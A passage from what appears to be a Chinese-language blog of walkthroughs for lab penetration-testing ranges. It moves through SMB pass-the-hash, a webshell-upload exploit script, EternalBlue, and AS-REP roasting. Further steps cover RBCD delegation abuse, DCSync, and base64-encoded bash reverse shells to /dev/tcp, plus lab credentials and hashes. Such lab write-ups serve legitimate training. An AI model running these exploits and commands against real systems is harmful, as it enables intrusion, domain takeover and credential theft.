class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nxc<span class="hljs-selector-class">.exe</span> smb <span class="hljs-number">172.22</span>.<span class="hljs-number">17.6</span> -u E:\Destop\name<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> E:\Destop\pass<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--no-bruteforce</span><br></code></pre></td></tr></table></figure><p>（其实这里应该直接使用SCADA工程师用户登录smb的）</p><p>登上rdp之后 根据提示 检查特权</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241112160151386.png" alt="image-20241112160151386"></p><p>但是这里可以直接转存sam表和system</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">reg <span class="hljs-built_in">save</span> hklm\sam sam.hive<br>reg <span class="hljs-built_in">save</span> hklm\<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.hive<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> secretsdump.<span class="hljs-keyword">py</span> -sam E:\Destop\sam.hive -<span class="hljs-built_in">system</span> <br><br>nxc.<span class="hljs-keyword">exe</span> smb <span class="hljs-number">172.22</span>.<span class="hljs-number">17.6</span> -<span class="hljs-keyword">u</span> Administrator -H f82292b7ac79b05d5b0e3d<br><span class="hljs-number">302</span>bd0d279 -<span class="hljs-keyword">X</span> <span class="hljs-string">&quot;type ~/flag/f*&quot;</span><br></code></pre></td></tr></table></figure><p>接下来 用刚刚ftp获得的一个管理员凭据爆破</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WIN</span>-SCADA: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">26</span>.xx<br><span class="hljs-attribute">Username</span>: Administrator<br><span class="hljs-attribute">Password</span>: IYnT3GyCiy3<br><br><span class="hljs-attribute">nxc</span>.exe smb <span class="hljs-number">172.22.26.1</span>/<span class="hljs-number">24</span> -u Administrator -p IYnT3GyCiy3<br></code></pre></td></tr></table></figure><p>flag3登录上去点击就送</p><h2 id="Initial（ok）"><a href="#Initial（ok）" class="headerlink" title="Initial（ok）"></a>Initial（ok）</h2><p>外网没什么好说的 tp框架 工具梭</p><p>sudo -l 发现mysql特权</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241114152154847.png" alt="image-20241114152154847"></p><p>提不了权 直接读一个flag</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241114152343340.png" alt="image-20241114152343340"></p><p>fscan -h xxxx&#x2F;24 -hn 跳过本机ip</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241114152718660.png" alt="image-20241114152718660"></p><p>发现还有三台主机</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.18</span> 开了<span class="hljs-number">3389</span>的信呼OA<br><span class="hljs-number">172.22.1.21</span> win7<br><span class="hljs-number">172.22.1.2</span>  域控<br></code></pre></td></tr></table></figure><p>exp直接打oa</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import requests<br>session = requests<span class="hljs-selector-class">.session</span>()<br>url_pre = <span class="hljs-string">&#x27;http://172.22.1.18/&#x27;</span><br>url1 = url_pre + <span class="hljs-string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br>url2 = url_pre + <span class="hljs-string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br>url3 = url_pre + <span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br>data1 = &#123;<br>    <span class="hljs-string">&#x27;rempass&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;jmpass&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>    <span class="hljs-string">&#x27;device&#x27;</span>: <span class="hljs-string">&#x27;1625884034525&#x27;</span>,<br>    <span class="hljs-string">&#x27;ltype&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminuser&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4=::&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminpass&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4xMjM=&#x27;</span>,<br>    <span class="hljs-string">&#x27;yanzm&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br>r = session<span class="hljs-selector-class">.post</span>(url1, data=data1)<br>r = session<span class="hljs-selector-class">.post</span>(url2, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&#x27;r+&#x27;</span>)&#125;)<br>filepath = <span class="hljs-built_in">str</span>(r<span class="hljs-selector-class">.json</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;filepath&#x27;</span>]</span>)<br>filepath = <span class="hljs-string">&quot;/&quot;</span> + filepath<span class="hljs-selector-class">.split</span>(<span class="hljs-string">&#x27;.uptemp&#x27;</span>)<span class="hljs-selector-attr">[0]</span> + <span class="hljs-string">&#x27;.php&#x27;</span><br>id = r<span class="hljs-selector-class">.json</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;id&#x27;</span>]</span><br>url3 = url_pre + f<span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span><br>r = session<span class="hljs-selector-class">.get</span>(url3)<br>r = session<span class="hljs-selector-class">.get</span>(url_pre + filepath)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(r.text)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(url_pre + filepath)</span></span><br></code></pre></td></tr></table></figure><p><a href="http://172.22.1.18//upload/2024-11/14_15460476.php">http://172.22.1.18//upload/2024-11/14_15460476.php</a></p><p>尝试对win2008 使用永恒之蓝 这里用方程式</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">msfvenom -p windows/exec CMD=<span class="hljs-string">&#x27;cmd.exe /k &quot;net user test test@123 /add &amp;&amp; net localgroup administrators test /add&quot;&#x27;</span> EXITFUNC=<span class="hljs-built_in">none</span> -f dll &gt; <span class="hljs-regexp">/tmp/</span>x64.dll<br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241114160018542.png" alt="image-20241114160018542"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241114160724717.png" alt="image-20241114160724717"></p><p>一直没打通 换msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 -q msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid<br><span class="hljs-built_in">set</span> RHOSTS 172.22.1.21<br>exploit<br></code></pre></td></tr></table></figure><p>尝试psexec失败 可能没开admin$</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> psexec.py xiaorang.lab/administrator@<span class="hljs-number">172.22.1.2</span> -hashes AADA8EDA23213C025AE50F5CD5697D9F:<span class="hljs-number">10</span>cf89a850fb1cdbe6bb432b859164c8<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cmb</span>拿下flag<br><span class="hljs-attribute">proxychains4</span> -q crackmapexec smb <span class="hljs-number">172.22.1.2</span> -u Administrator -H <span class="hljs-number">10</span>cf89a850fb1cdbe6bb432b859164c8 -x <span class="hljs-string">&quot;type users/administrator/f*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241114162501036.png" alt="image-20241114162501036"></p><h2 id="Flarum（ok）"><a href="#Flarum（ok）" class="headerlink" title="Flarum（ok）"></a>Flarum（ok）</h2><p>提示弱口令 爆破得到administrator&#x2F;1chris</p><p>根据<a href="https://tttang.com/archive/1714/">从偶遇Flarum开始的RCE之旅 - 跳跳糖</a></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241115154943338.png" alt="image-20241115154943338"></p><p>插入css后再将css修改为</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.test</span> &#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-built_in">data-uri</span>(<span class="hljs-string">&#x27;phar://./assets/forum.css&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>查suid</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241115155101882.png"></p><p>利用capabilities提权</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241115155555520.png" alt="image-20241115155555520"></p><p>openssl利用</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">openssl</span> enc -in <span class="hljs-string">&quot;/root/flag/flag01.txt&quot;</span><br></code></pre></td></tr></table></figure><p>在访问web的时候可以发现assets目录，在shell中找到&#x2F;public&#x2F;assets写马（注意转义$）</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt; 1.php</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/fscan -h 172.22.60.52/</span><span class="hljs-number">24</span> -hn <span class="hljs-number">172.22</span>.<span class="hljs-number">60.52</span> &gt;<span class="hljs-number">1</span>.txt <br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241115160055948.png" alt="image-20241115160055948"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.60.8</span> DC<br><br><span class="hljs-number">172.22.60.15</span> 个人主机 <br><br><span class="hljs-number">172.22.60.42</span> 文件服务器<br></code></pre></td></tr></table></figure><p>这里由于没明显的横向手段，再第一台机子上再做信息收集</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241115160523067.png" alt="image-20241115160523067"></p><p>navicat socks有点麻烦 走蚁剑</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241115161558953.png" alt="image-20241115161558953"></p><p>拿到一个name表</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241115161654237.png" alt="image-20241115161654237"></p><p>尝试AS-REP ROASTING 找没开启预认证的用户（GetnpUser 指定dcip 用户字典 域名称+&#x2F;）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> GetNPUsers.py -dc-ip <span class="hljs-number">172.22.60.8</span> -usersfile E:\Destop\name.txt xiaorang.lab/<br>！记得加/<br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo hashcat -m <span class="hljs-number">18200</span> <span class="hljs-symbol">&#x27;hash</span>&#x27; 字典 <span class="hljs-comment">--force</span><br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241115163140719.png" alt="image-20241115163140719"></p><p>得到一个wangyun&#x2F;Adm12geC</p><p>rdp登个人pc 发现xshell SharpXDecrypt提取密码</p><p>zhangxin&#x2F;admin4qwY38cc</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241115163354768.png" alt="image-20241115163354768"></p><p>再收集一下域内信息</p><p><a href="https://xz.aliyun.com/t/11555?time__1311=mqmx0DBD2Gqiw40vofDy7D9m6GOCDcGiG7oD&alichlgref=https://xz.aliyun.com/u/50470#toc-18">域渗透之委派攻击全集 - 先知社区</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">指定用户密码，域名和域ip<br>proxychains -<span class="hljs-selector-tag">q</span> bloodhound-python -u wangyun -<span class="hljs-selector-tag">p</span> Adm12geC -d xiaorang<span class="hljs-selector-class">.lab</span> -c <span class="hljs-attribute">all</span> -ns <span class="hljs-number">172.22</span>.<span class="hljs-number">60.8</span> <span class="hljs-attr">--zip</span> <span class="hljs-attr">--dns-tcp</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">添加机器用户<br>proxychains4 impacket-addcomputer xiaorang.lab/zhangxin:<span class="hljs-string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">60.8</span> -dc-host xiaorang<span class="hljs-selector-class">.lab</span> -computer-name <span class="hljs-string">&#x27;hacker$&#x27;</span> -computer-pass <span class="hljs-string">&#x27;0x401@admin&#x27;</span><br>配置rbcd<br>proxychains4 impacket-rbcd xiaorang.lab/zhangxin:<span class="hljs-string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">60.8</span> -action write -delegate-to <span class="hljs-string">&#x27;Fileserver$&#x27;</span> -delegate-from <span class="hljs-string">&#x27;hacker$&#x27;</span><br>伪造票据<br>proxychains4 impacket-getST xiaorang.lab/<span class="hljs-string">&#x27;hacker$&#x27;</span>:<span class="hljs-string">&#x27;0x401@admin&#x27;</span> -spn cifs/Fileserver<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -impersonate Administrator -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">60.8</span><br>制定票据<br>export KRB5CCNAME=Administrator<span class="hljs-selector-class">.ccache</span><br>ccache改名 修改hosts文件<br>横向移动<br>proxychains4 impacket-psexec Administrator@FILESERVER<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -k -no-pass -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">60.8</span> -codec gbk<br></code></pre></td></tr></table></figure><p>fileserver开了DCSync</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cobol">proxychains4 impacket-secretsdump -k -no-pass FILESERVER.xiaorang.lab -dc-ip 172.22.60.8<br>获取system hash值<br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241115170109853.png" alt="image-20241115170109853"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> impacket-secretsdump xiaorang.lab/<span class="hljs-string">&#x27;Fileserver$&#x27;</span>:@<span class="hljs-number">172.22.60.8</span> -hashes <span class="hljs-string">&#x27;:951d8a9265dfb652f42e5c8c497d70dc&#x27;</span> -just-dc-user Administrator<br></code></pre></td></tr></table></figure><p>再去打dscync</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241115170215843.png" alt="image-20241115170215843"></p><p>拿到hash横向就可以了</p><h2 id="TIME（ok）"><a href="#TIME（ok）" class="headerlink" title="TIME（ok）"></a>TIME（ok）</h2><p>默认fscan没扫到东西</p><p>fscan -h 39.99.130.250 -p 0-65535 扫全端口</p><p>（这里其实在扫全端口过程中发现开了neo4j 直接搜到文章）</p><p><a href="https://www.cnblogs.com/Kawakaze777/p/18153842">CVE-2021-34371 Neo4j-Shell 漏洞复现 - 凪白Kw - 博客园</a></p><p>出于编码问题 本来需要base编码反弹shell语句</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">&quot;bash -c </span><span class="hljs-template-variable">&#123;echo,base编码的bash -i &gt;&amp; /dev/tcp/ip/4444&gt;&amp;1&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;bash,-i&#125;</span><span class="language-xml">&quot; </span><br></code></pre></td></tr></table></figure><p> 但这里貌似环境冲突，让朋友直接给我弹了一个msf shell</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241118151916370.png" alt="image-20241118151916370"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241118152046360.png" alt="image-20241118152046360"></p><p>-hn跳过本机</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.6.12</span> DC<br><span class="hljs-number">172.22.6.25</span> WIN2019<br><span class="hljs-number">172.22.6.38</span> 后台登陆web<br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241118152239390.png" alt="image-20241118152239390"></p><p>搭好隧道。提示kerberos协议</p><p>猜到可能又是GetNPusers </p><p>很无奈这里是一个前台登录sql注入 sqlmap –dump脱库</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241118152850681.png" alt="image-20241118152850681"></p><p>处理文件格式</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">awk</span> -F@ <span class="hljs-string">&#x27;&#123;print <span class="hljs-variable">$1</span>&#125;&#x27;</span> ./name.txt&gt;<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo hashcat -m <span class="hljs-number">18200</span> hash.txt <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt --force<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wenshao/hellokitty<br>zhangxin/strawberry<br></code></pre></td></tr></table></figure><p>RDP登录 bloodhound找攻击路径</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241118160210757.png" alt="image-20241118160210757"></p><p>这里发现需要也得到yuxuan用户权限，抓内存凭据失败，看文章找到抓自动登录密码</p><p>可以用msf autologin 或者 winpeas 也可以</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241118173604270.png" alt="image-20241118173604270"></p><p>yuxuan&#x2F;Yuxuan7QbrgZ3L</p><p>使用该用户登录后 利用sid权限滥用直接dump哈希</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">lsadump::dcsync <span class="hljs-regexp">/domain:xiaorang.lab /</span>all /csv<span class="hljs-string">&quot; &quot;</span><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>后面psexec横向</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241118174216674.png" alt="image-20241118174216674"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">python3 psexec<span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">a</span><br>dministrator<span class="hljs-keyword">@172</span>.22.6.12 -hashes <span class="hljs-string">&quot;:04d93ffd6f5f6e4490e0de23f240a5e9&quot;</span> -codec gbk<br></code></pre></td></tr></table></figure><h2 id="Delivery"><a href="#Delivery" class="headerlink" title="Delivery"></a>Delivery</h2><p>fscan发现ftp匿名登录和一个web界面</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120095826399.png" alt="image-20241120095826399"></p><p>下载发现XStream和cc依赖</p><p><a href="https://www.cnblogs.com/thelostworld/p/14810682.html">XStream远程代码执行（CVE-2021-29505 ） - thelostworld - 博客园</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-cp ysoserial.<span class="hljs-keyword">jar </span>ysoserial.exploit.<span class="hljs-keyword">JRMPListener </span><span class="hljs-number">1098</span> CommonsCollections6 <span class="hljs-string">&quot;bash -c &#123;echo,base编码后的bash -i &amp;&gt; /dev/tcp/ip/4444 0&gt;&amp;1&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br>nc -lvnp <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120095951290.png" alt="image-20241120095951290"></p><p>远程下载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget -P <span class="hljs-regexp">/tmp http:/</span><span class="hljs-regexp">/ip:1234/</span>agent_linux_x64<br>wget -P <span class="hljs-regexp">/tmp http:/</span><span class="hljs-regexp">/ip:1234/</span>fscan<br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120100550341.png" alt="image-20241120100550341"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.13.6</span> DC<br><span class="hljs-number">172.22.13.28</span> web mysql弱口令<br><span class="hljs-number">172.22.13.57</span> Centos<br></code></pre></td></tr></table></figure><p>根据提示NFS</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120100841192.png" alt="image-20241120100841192"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">proxychains4 -q showmonut -e <span class="hljs-number">172.22</span>.<span class="hljs-number">13.57</span><br>proxychains4 -q mount -t nfs <span class="hljs-number">172.22</span>.<span class="hljs-number">13.57</span><span class="hljs-symbol">:/home/joyce</span> temp -o nolock<br></code></pre></td></tr></table></figure><p>不知道什么原因 kali上挂载失败</p><p>尝试在靶机上下载的时候shell坏了 又得重开靶场环境</p><h2 id="privilege"><a href="#privilege" class="headerlink" title="privilege"></a>privilege</h2><p>fscan扫描到<a href="http://www.zip泄露/">www.zip泄露</a></p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">&#x27;DB_USER&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span> );<br><br><span class="hljs-comment">/** Database password */</span><br><span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;3%I$A*gl&amp;9^b#&#x27;</span> );<br><br><span class="hljs-comment">/** Database hostname */</span><br><span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">&#x27;DB_HOST&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span> );<br></code></pre></td></tr></table></figure><p>拿到数据库密码后连不上 继续收集信息</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120141917493.png" alt="image-20241120141917493"></p><p>发现一个任意文件读和一个phpinfo</p><p>根据题目给出的C:\ProgramData\Jenkins.jenkins</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/20240124143239-5ee04ddc-ba82-1.png" alt="img"></p><p>去读取密码<img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120142429062.png" alt="image-20241120142429062"></p><p>RCE</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120142623207.png" alt="image-20241120142623207"></p><p>windows环境 可以远程下载cs&#x2F;msf马执行 比较麻烦  也可以选择加用户开3389</p><p>这里用cs的web投递 通过以下网站编码payload 这一步卡了很久</p><p><a href="https://r0yanx.com/tools/java_exec_encode/">java.lang.Runtime.exec() Payload Workarounds - @Jackson_T</a></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120144109238.png" alt="image-20241120144109238"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120144401211.png" alt="image-20241120144401211"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.14.11</span> DC<br><span class="hljs-number">172.22.14.16</span> web gitlab<br><span class="hljs-number">172.22.14.31</span> ORACLE<br><span class="hljs-number">172.22.14.46</span><br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120145545582.png" alt="image-20241120145545582"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">提示去找jenkins中的gitlab api <span class="hljs-built_in">token</span> <br>f12可以看到<br>AQAAABAAAAAg9+<span class="hljs-number">7</span>GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh<br></code></pre></td></tr></table></figure><p>但是用设定功能可以直接抓到明文token</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120145843227.png" alt="image-20241120145843227"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span 